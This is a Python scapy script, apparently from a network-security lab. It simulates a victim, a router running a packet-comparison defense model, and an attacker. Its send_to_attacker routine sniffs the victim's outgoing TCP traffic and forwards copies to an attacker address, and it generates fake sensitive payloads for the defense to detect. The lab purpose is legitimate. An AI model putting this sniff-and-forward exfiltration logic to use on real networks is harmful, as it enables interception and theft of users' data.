#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy
from random import randint
import os
import my_ips
import router
from time import sleep

role = 'victim'

# Global 
def_model = router.DefenseModel()

#victim_ip = os.environ['victim_ip']
#attacker_ip = os.environ['attacker_ip']
#router_ip = os.environ['router_ip']

#mypkt = IP(dst=router_ip)/TCP()/Raw(load='test1')
#r1 = send(mypkt,iface='eth1',timeout=2)
#exit()

#Modular packet sniffing function
def packet_sniffer(my_filter, my_prn):
    print('Calling packet sniffer function.')
    pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)

#Send packets to a destination via the router VM. The router VM
#simulates a router on the network that is equipped with the
#defense model. The packet is sent to the router, which processes
#and reroutes the packet to its intended recipient.
def send_to_router(packet):
    true_src = packet[IP].src
    true_dst = packet[IP].dst
    true_dport = packet[TCP].dport
    true_load = packet[Raw].load

    load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")

    new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)

    print('Sending packet to router:', new_packet.show())
    r1 = send(new_packet, iface='eth1')

#Victim functions
#---

#Sends packet to attacker (via the router VM)
def send_to_attacker(packet):
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)

    send_to_router(new_packet)
#---

#Router functions
#---

# Append the IP address info of the original sender (before being 
# forwarded by the router)
# Format is: |ORIG_SRC:xxx.xxx.xxx.xxx
def append_orig_source(data, orig_source):
    new_data = data + ('|ORIG_SRC=' + orig_source).encode("utf-8")

    return new_data

def reroute_packet(packet):
    print('Packet @ reroute_packet stage:')
    print(packet.show())
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    data = append_orig_source(data, packet[IP].src)

    forwarded_packet = IP()/TCP()/Raw(load=data)

    #Get destination address that was embedded in the payload
    dst_addr = get_packet_destination(data)
        
    # IP address is always the first in the list 
    
        
    # Source = hardcoded router's IP address 
    forwarded_packet[IP].src = get_if_addr('eth1')
    forwarded_packet[IP].dst = dst_addr
        
    forwarded_packet[TCP].sport = packet[TCP].sport
    forwarded_packet[IP].dport = packet[TCP].dport

    print('Forwarded packet:', forwarded_packet.show())
    r1 = send(forwarded_packet, iface='eth1')

    defense_model(forwarded_packet)

def defense_model(packet):
    print('Getting packet IP')
    source = packet[IP].src
    print('Source:', source)


    if packet is not None:
        if def_model.check_packet_type(packet):
            key, payload = def_model.extract_and_hash_packet(packet)
            def_model.packet_comparison_algorithm(key, payload)

    
        print('Printing dictionary:')
        def_model.print_contents_of_packet_dictionary()





#Parses payload to get the true desination address of the packet.
#Needed to implement a 'router' that has the defense model.
def get_packet_destination(data):

    data = data.decode('utf-8')
    # Look for this at the end of the payload
    test_field = "|ORIG_DST="
                                                         
    # end info = information after the main payload 
    end_info = data.partition(test_field)[2] 
    if(end_info == ''):
        print(end_info)
        print(data)
        return '1.1.1.1';
                                                         
    # Split the end substring by | delimiter 
    end_list = end_info.split('|')
    
    print(end_list[0])
    return end_list[0]

#---

#Attacker functions
#---

def log_packet(packet):
    f = open('log_file.txt', 'a')
    f.write(packet.show())
    f.write('\n')
    f.close()

#---

# Simulate external host that sends randomized packets
def build_packet(external_host_ip, external_ip):
    RANDOMIZED_WORDS = ['This', 'packet', 'sentence', 'password', 'username', 
            'advertisement', 'confidential', 'urgent', 'email', 'facebook', 'twitter',
            'linkedin', 'important', 'details', 'about', 'this', 'warranty', 
            'family', 'colleague', 'low', 'priority', 'social', 'security', 'number',
            'is', '555-55-5555', 'credit', 'card', 'number', 'is', '4444-4444-4444-4444', 
            'bank', 'account', 'number', 'is', '1234567', 'routing', 'number', 'is', 
            '2222222']

    # Generate a payload with a string of 10 randomized characters
    MAX = 10
    payload_string = ''
    # Loop through 10 times to randomly select the 10 words
    for i in range(0, MAX):
        payload_string += RANDOMIZED_WORDS[randint(0, len(RANDOMIZED_WORDS) - 1)]
        if i != MAX - 1:
            payload_string += ' '

    
    attacker_packet = IP(dst=my_ips.router_ip)/TCP(dport=80)/Raw(load=payload_string)

    send_to_attacker(attacker_packet)
    
    # Append the original victim destination at end of payload

    packet = IP(src=external_host_ip, dst=external_ip)/TCP(dport=80)/Raw(load=payload_string)
    send_to_router(packet)

def send_packet(packet):
    print('Sending external packet')
    r1 = send(packet, iface='eth1')
    



if __name__=='__main__':
    local_ip = get_if_addr('eth1')
    if(role == 'xxxxx'):
        packet_sniffer('src host ' + local_ip + ' and tcp', send_to_attacker)
    elif(role == 'router'):
        packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
    elif(role == 'attacker'):
        packet_sniffer('src host ' + my_ips.victim_ip + ' and tcp', log_packet) 
    elif role == 'victim':
        while True:
            build_packet(my_ips.victim_ip, my_ips.external_host_ip)
            sleep(5)
